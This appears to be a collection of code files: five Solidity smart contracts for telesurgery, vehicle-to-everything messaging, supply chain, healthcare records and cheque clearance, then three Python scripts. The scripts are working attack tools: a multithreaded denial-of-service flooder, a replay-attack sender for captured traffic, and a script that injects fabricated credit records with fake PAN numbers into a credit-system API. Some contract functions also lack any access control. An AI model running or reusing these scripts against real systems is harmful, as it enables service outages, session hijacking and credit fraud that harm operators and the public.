// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BlockHealthTelesurgery {

    // Define entities
    enum Status { Pending, InProgress, Completed, Cancelled }
    enum AnomalyStatus { Safe, UnderReview, ThreatDetected }
    
    struct Patient {
        string name;
        address patientAddress;
    }
    
    struct Doctor {
        string name;
        address doctorAddress;
    }
    
    struct Caregiver {
        string name;
        address caregiverAddress;
    }
    
    struct UAV {
        string uavID;
        address uavAddress;
    }
    
    struct Equipment {
        string equipmentName;
        string equipmentID;
    }
    
    struct Pharmacy {
        string pharmacyName;
        address pharmacyAddress;
    }

    struct SurgerySession {
        Patient patient;
        Doctor doctor;
        Caregiver caregiver;
        Equipment equipment;
        Pharmacy pharmacy;
        UAV uav;
        Status surgeryStatus;
        AnomalyStatus anomalyStatus;
        uint timestamp; // Start time of the session
    }
    
    // Map to store all telesurgery sessions
    mapping (uint => SurgerySession) public surgerySessions;
    uint public sessionCount = 0;

    // Events
    event SurgeryInitiated(uint sessionId, string patientName, string equipmentName);
    event SurgeryCompleted(uint sessionId, string patientName, string equipmentName);
    event AnomalyDetected(uint sessionId, string anomalyType, string status);
    
    // Add new telesurgery session
    function initiateSurgery(
        string memory _patientName, 
        address _patientAddress,
        string memory _doctorName, 
        address _doctorAddress,
        string memory _caregiverName, 
        address _caregiverAddress,
        string memory _equipmentName, 
        string memory _equipmentID,
        string memory _pharmacyName, 
        address _pharmacyAddress,
        string memory _uavID, 
        address _uavAddress
    ) public {
        SurgerySession memory newSession = SurgerySession({
            patient: Patient(_patientName, _patientAddress),
            doctor: Doctor(_doctorName, _doctorAddress),
            caregiver: Caregiver(_caregiverName, _caregiverAddress),
            equipment: Equipment(_equipmentName, _equipmentID),
            pharmacy: Pharmacy(_pharmacyName, _pharmacyAddress),
            uav: UAV(_uavID, _uavAddress),
            surgeryStatus: Status.Pending,
            anomalyStatus: AnomalyStatus.Safe,
            timestamp: block.timestamp
        });
        
        surgerySessions[sessionCount] = newSession;
        emit SurgeryInitiated(sessionCount, _patientName, _equipmentName);
        sessionCount++;
    }

    // Update surgery status to InProgress
    function startSurgery(uint _sessionId) public {
        require(_sessionId < sessionCount, "Invalid Session ID");
        SurgerySession storage session = surgerySessions[_sessionId];
        session.surgeryStatus = Status.InProgress;
    }
    
    // Mark surgery as completed
    function completeSurgery(uint _sessionId) public {
        require(_sessionId < sessionCount, "Invalid Session ID");
        SurgerySession storage session = surgerySessions[_sessionId];
        session.surgeryStatus = Status.Completed;
        emit SurgeryCompleted(_sessionId, session.patient.name, session.equipment.equipmentName);
    }
    
    // Cancel surgery session in case of an anomaly or threat
    function cancelSurgery(uint _sessionId) public {
        require(_sessionId < sessionCount, "Invalid Session ID");
        SurgerySession storage session = surgerySessions[_sessionId];
        session.surgeryStatus = Status.Cancelled;
    }
    
    // Function to handle anomaly detection (could be called by an oracle)
    function reportAnomaly(uint _sessionId, string memory _anomalyType) public {
        require(_sessionId < sessionCount, "Invalid Session ID");
        SurgerySession storage session = surgerySessions[_sessionId];
        session.anomalyStatus = AnomalyStatus.ThreatDetected;
        session.surgeryStatus = Status.Cancelled;
        emit AnomalyDetected(_sessionId, _anomalyType, "ThreatDetected");
    }
    
    // Function to reset anomaly status after review
    function resetAnomalyStatus(uint _sessionId) public {
        require(_sessionId < sessionCount, "Invalid Session ID");
        SurgerySession storage session = surgerySessions[_sessionId];
        session.anomalyStatus = AnomalyStatus.UnderReview;
    }

}










// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title V2X Communication Smart Contract
 * @dev This contract facilitates secure communication and data exchange in a V2X ecosystem.
 */
contract V2XCommunication {
    // Events
    event VehicleRegistered(address indexed vehicle, string vehicleId);
    event InfrastructureRegistered(address indexed infra, string infraId);
    event ServiceProviderRegistered(address indexed provider, string providerId);
    event EmergencyServiceRegistered(
        address indexed service,
        string serviceId
    );
    event DataShared(
        address indexed sender,
        address indexed receiver,
        string dataType,
        uint256 timestamp
    );

    // Structs
    struct Vehicle {
        string vehicleId;
        string ownerName;
        bool isRegistered;
    }

    struct Infrastructure {
        string infraId;
        string location;
        bool isRegistered;
    }

    struct ServiceProvider {
        string providerId;
        string serviceType; // E.g., fuel station, toll, parking
        bool isRegistered;
    }

    struct EmergencyService {
        string serviceId;
        string serviceType; // E.g., police, ambulance
        bool isRegistered;
    }

    struct CommunicationData {
        address sender;
        address receiver;
        string dataType;
        string dataContent;
        uint256 timestamp;
    }

    // State variables
    mapping(address => Vehicle) public vehicles; // Stores vehicle information
    mapping(address => Infrastructure) public infrastructures; // Stores infrastructure information
    mapping(address => ServiceProvider) public serviceProviders; // Stores service provider information
    mapping(address => EmergencyService) public emergencyServices; // Stores emergency service information
    CommunicationData[] public communications; // Logs communications

    // Modifiers
    modifier onlyRegisteredVehicle() {
        require(vehicles[msg.sender].isRegistered, "Vehicle is not registered.");
        _;
    }

    modifier onlyRegisteredInfrastructure() {
        require(
            infrastructures[msg.sender].isRegistered,
            "Infrastructure is not registered."
        );
        _;
    }

    modifier onlyRegisteredServiceProvider() {
        require(
            serviceProviders[msg.sender].isRegistered,
            "Service provider is not registered."
        );
        _;
    }

    modifier onlyRegisteredEmergencyService() {
        require(
            emergencyServices[msg.sender].isRegistered,
            "Emergency service is not registered."
        );
        _;
    }

    // Functions to register entities
    function registerVehicle(string memory _vehicleId, string memory _ownerName)
        public
    {
        require(!vehicles[msg.sender].isRegistered, "Vehicle already registered.");
        vehicles[msg.sender] = Vehicle({
            vehicleId: _vehicleId,
            ownerName: _ownerName,
            isRegistered: true
        });

        emit VehicleRegistered(msg.sender, _vehicleId);
    }

    function registerInfrastructure(string memory _infraId, string memory _location)
        public
    {
        require(
            !infrastructures[msg.sender].isRegistered,
            "Infrastructure already registered."
        );
        infrastructures[msg.sender] = Infrastructure({
            infraId: _infraId,
            location: _location,
            isRegistered: true
        });

        emit InfrastructureRegistered(msg.sender, _infraId);
    }

    function registerServiceProvider(string memory _providerId, string memory _serviceType)
        public
    {
        require(
            !serviceProviders[msg.sender].isRegistered,
            "Service provider already registered."
        );
        serviceProviders[msg.sender] = ServiceProvider({
            providerId: _providerId,
            serviceType: _serviceType,
            isRegistered: true
        });

        emit ServiceProviderRegistered(msg.sender, _providerId);
    }

    function registerEmergencyService(
        string memory _serviceId,
        string memory _serviceType
    ) public {
        require(
            !emergencyServices[msg.sender].isRegistered,
            "Emergency service already registered."
        );
        emergencyServices[msg.sender] = EmergencyService({
            serviceId: _serviceId,
            serviceType: _serviceType,
            isRegistered: true
        });

        emit EmergencyServiceRegistered(msg.sender, _serviceId);
    }

    // Function to share data between entities
    function shareData(
        address _receiver,
        string memory _dataType,
        string memory _dataContent
    ) public {
        require(
            vehicles[_receiver].isRegistered ||
                infrastructures[_receiver].isRegistered ||
                serviceProviders[_receiver].isRegistered ||
                emergencyServices[_receiver].isRegistered,
            "Receiver is not a registered entity."
        );

        CommunicationData memory newData = CommunicationData({
            sender: msg.sender,
            receiver: _receiver,
            dataType: _dataType,
            dataContent: _dataContent,
            timestamp: block.timestamp
        });

        communications.push(newData);

        emit DataShared(msg.sender, _receiver, _dataType, block.timestamp);
    }

    // View function to get all communications
    function getCommunications() public view returns (CommunicationData[] memory) {
        return communications;
    }
}








// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SupplyChain {

    // Structure to represent a product
    struct Product {
        uint256 id;
        string name;
        string description;
        address currentOwner;
        string currentStatus;
        bool exists;
    }

    // Mapping from product ID to Product details
    mapping(uint256 => Product) private products;

    // Event to log product creation
    event ProductCreated(uint256 id, string name, address owner);

    // Event to log product status updates
    event ProductUpdated(uint256 id, string status, address updatedBy);

    // Create a new product
    function createProduct(
        uint256 _id,
        string memory _name,
        string memory _description
    ) public {
        require(!products[_id].exists, "Product ID already exists.");

        products[_id] = Product({
            id: _id,
            name: _name,
            description: _description,
            currentOwner: msg.sender,
            currentStatus: "Created",
            exists: true
        });

        emit ProductCreated(_id, _name, msg.sender);
    }

    // Update the product's status and transfer ownership
    function updateProduct(
        uint256 _id,
        string memory _newStatus,
        address _newOwner
    ) public {
        require(products[_id].exists, "Product does not exist.");
        require(products[_id].currentOwner == msg.sender, "Only the current owner can update the product.");

        products[_id].currentStatus = _newStatus;
        products[_id].currentOwner = _newOwner;

        emit ProductUpdated(_id, _newStatus, msg.sender);
    }

    // Retrieve product details
    function getProduct(uint256 _id)
        public
        view
        returns (
            uint256 id,
            string memory name,
            string memory description,
            address currentOwner,
            string memory currentStatus
        )
    {
        require(products[_id].exists, "Product does not exist.");
        
        Product memory product = products[_id];
        return (
            product.id,
            product.name,
            product.description,
            product.currentOwner,
            product.currentStatus
        );
    }
}


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HealthcareSystem {
    address public admin;

    // Define roles
    enum UserRole {Admin, Doctor, Patient, Pharmacy}

    // User structure
    struct User {
        string name;
        UserRole role;
        bool isRegistered;
    }

    // Patient structure
    struct PatientRecord {
        uint256 id;
        address patientAddress;
        string diagnosis;
        string treatment;
        string prescription;
        uint256 billAmount;
        bool isPaid;
    }

    // Medical equipment structure
    struct Equipment {
        uint256 id;
        string name;
        string description;
        uint256 price;
        bool isAvailable;
    }

    uint256 private recordCounter;
    uint256 private equipmentCounter;

    mapping(address => User) public users;
    mapping(uint256 => PatientRecord) public patientRecords;
    mapping(uint256 => Equipment) public equipments;

    event UserRegistered(address indexed userAddress, string name, UserRole role);
    event PatientRecordCreated(uint256 indexed recordId, address patientAddress);
    event EquipmentAdded(uint256 indexed equipmentId, string name);
    event EquipmentPurchased(uint256 indexed equipmentId, address purchaser);
    event BillPaid(uint256 indexed recordId, address patientAddress, uint256 amount);

    modifier onlyAdmin() {
        require(users[msg.sender].role == UserRole.Admin, "Only admin can perform this action");
        _;
    }

    modifier onlyDoctor() {
        require(users[msg.sender].role == UserRole.Doctor, "Only doctor can perform this action");
        _;
    }

    modifier onlyRegistered() {
        require(users[msg.sender].isRegistered, "You must be registered to perform this action");
        _;
    }

    constructor() {
        admin = msg.sender;
        users[admin] = User("Admin", UserRole.Admin, true);
    }

    // Register a user
    function registerUser(address _userAddress, string memory _name, UserRole _role) public onlyAdmin {
        require(!users[_userAddress].isRegistered, "User already registered");
        users[_userAddress] = User(_name, _role, true);
        emit UserRegistered(_userAddress, _name, _role);
    }

    // Create a patient record
    function createPatientRecord(
        address _patientAddress,
        string memory _diagnosis,
        string memory _treatment,
        string memory _prescription,
        uint256 _billAmount
    ) public onlyDoctor {
        require(users[_patientAddress].role == UserRole.Patient, "Address is not a patient");
        recordCounter++;
        patientRecords[recordCounter] = PatientRecord({
            id: recordCounter,
            patientAddress: _patientAddress,
            diagnosis: _diagnosis,
            treatment: _treatment,
            prescription: _prescription,
            billAmount: _billAmount,
            isPaid: false
        });
        emit PatientRecordCreated(recordCounter, _patientAddress);
    }

    // Pay a bill
    function payBill(uint256 _recordId) public payable {
        PatientRecord storage record = patientRecords[_recordId];
        require(record.patientAddress == msg.sender, "Only the patient can pay their bill");
        require(!record.isPaid, "Bill already paid");
        require(msg.value >= record.billAmount, "Insufficient payment");

        record.isPaid = true;
        emit BillPaid(_recordId, msg.sender, msg.value);
    }

    // Add a medical equipment
    function addEquipment(string memory _name, string memory _description, uint256 _price) public onlyAdmin {
        equipmentCounter++;
        equipments[equipmentCounter] = Equipment({
            id: equipmentCounter,
            name: _name,
            description: _description,
            price: _price,
            isAvailable: true
        });
        emit EquipmentAdded(equipmentCounter, _name);
    }

    // Purchase medical equipment
    function purchaseEquipment(uint256 _equipmentId) public payable {
        Equipment storage equipment = equipments[_equipmentId];
        require(equipment.isAvailable, "Equipment not available");
        require(msg.value >= equipment.price, "Insufficient funds");

        equipment.isAvailable = false;
        emit EquipmentPurchased(_equipmentId, msg.sender);
    }

    // Get user details
    function getUser(address _userAddress) public view returns (string memory name, UserRole role, bool isRegistered) {
        User memory user = users[_userAddress];
        return (user.name, user.role, user.isRegistered);
    }

    // Get patient record
    function getPatientRecord(uint256 _recordId)
        public
        view
        returns (
            address patientAddress,
            string memory diagnosis,
            string memory treatment,
            string memory prescription,
            uint256 billAmount,
            bool isPaid
        )
    {
        PatientRecord memory record = patientRecords[_recordId];
        return (record.patientAddress, record.diagnosis, record.treatment, record.prescription, record.billAmount, record.isPaid);
    }

    // Get equipment details
    function getEquipment(uint256 _equipmentId)
        public
        view
        returns (string memory name, string memory description, uint256 price, bool isAvailable)
    {
        Equipment memory equipment = equipments[_equipmentId];
        return (equipment.name, equipment.description, equipment.price, equipment.isAvailable);
    }
}









// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ChequeClearance {
    struct Cheque {
        uint256 id;
        address issuer;
        address payee;
        uint256 amount;
        uint256 issueDate;
        bool cleared;
    }

    uint256 public chequeCounter = 0; // Counter for unique cheque IDs
    mapping(uint256 => Cheque) public cheques; // Store cheques by ID

    event ChequeIssued(uint256 indexed chequeId, address indexed issuer, address indexed payee, uint256 amount);
    event ChequeCleared(uint256 indexed chequeId, address indexed payee, uint256 amount);

    // Issue a new cheque
    function issueCheque(address _payee, uint256 _amount) public returns (uint256) {
        require(_amount > 0, "Amount must be greater than zero.");
        require(_payee != address(0), "Invalid payee address.");

        chequeCounter++;
        uint256 newChequeId = chequeCounter;

        // Create a new cheque
        cheques[newChequeId] = Cheque({
            id: newChequeId,
            issuer: msg.sender,
            payee: _payee,
            amount: _amount,
            issueDate: block.timestamp,
            cleared: false
        });

        emit ChequeIssued(newChequeId, msg.sender, _payee, _amount);
        return newChequeId;
    }

    // Clear a cheque
    function clearCheque(uint256 _chequeId) public {
        Cheque storage cheque = cheques[_chequeId];
        require(cheque.id == _chequeId, "Cheque not found.");
        require(cheque.payee == msg.sender, "Only the payee can clear this cheque.");
        require(!cheque.cleared, "Cheque already cleared.");
        require(address(this).balance >= cheque.amount, "Insufficient contract balance for clearance.");

        cheque.cleared = true;

        // Transfer funds to the payee
        payable(cheque.payee).transfer(cheque.amount);

        emit ChequeCleared(_chequeId, cheque.payee, cheque.amount);
    }

    // Deposit funds into the contract
    function depositFunds() public payable {
        require(msg.value > 0, "Deposit amount must be greater than zero.");
    }

    // Get cheque details
    function getCheque(uint256 _chequeId) public view returns (
        uint256 id,
        address issuer,
        address payee,
        uint256 amount,
        uint256 issueDate,
        bool cleared
    ) {
        Cheque memory cheque = cheques[_chequeId];
        require(cheque.id == _chequeId, "Cheque not found.");
        return (cheque.id, cheque.issuer, cheque.payee, cheque.amount, cheque.issueDate, cheque.cleared);
    }
}



DOS

import socket
import threading

def dos_attack(target_ip, target_port):
    try:
        # Create a raw socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        while True:
            # Send an overwhelming amount of data
            s.sendto(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n", (target_ip, target_port))
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    target_ip = input("Enter the target IP: ")
    target_port = int(input("Enter the target port: "))
    thread_count = int(input("Enter the number of threads: "))

    print(f"Launching DoS attack on {target_ip}:{target_port} with {thread_count} threads...")

    for i in range(thread_count):
        thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
        thread.start()







Replay 
import socket

def replay_attack(server_ip, server_port, captured_data):
    try:
        # Create a socket to send the replay data
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))
        print(f"Replaying data to {server_ip}:{server_port}")
        s.sendall(captured_data.encode())
        response = s.recv(1024)
        print(f"Server response: {response.decode()}")
        s.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Intercepted data to be replayed
    captured_data = input("Enter the captured data to replay: ")
    server_ip = input("Enter the server IP: ")
    server_port = int(input("Enter the server port: "))

    print("Initiating replay attack...")
    replay_attack(server_ip, server_port, captured_data)





cibil


import requests
import random
import string

def generate_fake_credit_record():
    # Generate a fake name
    name = ''.join(random.choices(string.ascii_letters, k=8))
    # Generate a fake credit score
    credit_score = random.randint(300, 900)
    # Generate a fake PAN number (India-specific unique identifier)
    pan = ''.join(random.choices(string.ascii_uppercase, k=5)) + str(random.randint(1000, 9999)) + random.choice(string.ascii_uppercase)

    return {
        "name": name,
        "credit_score": credit_score,
        "pan": pan
    }

def inject_fake_data(api_url, num_records):
    for _ in range(num_records):
        fake_record = generate_fake_credit_record()
        response = requests.post(api_url, json=fake_record)
        if response.status_code == 200:
            print(f"Successfully injected record: {fake_record}")
        else:
            print(f"Failed to inject record: {fake_record} | Status: {response.status_code}")

if __name__ == "__main__":
    api_url = input("Enter the API endpoint for the credit system: ")
    num_records = int(input("Enter the number of fake records to inject: "))
    
    print(f"Injecting {num_records} fake records into {api_url}...")
    inject_fake_data(api_url, num_records)











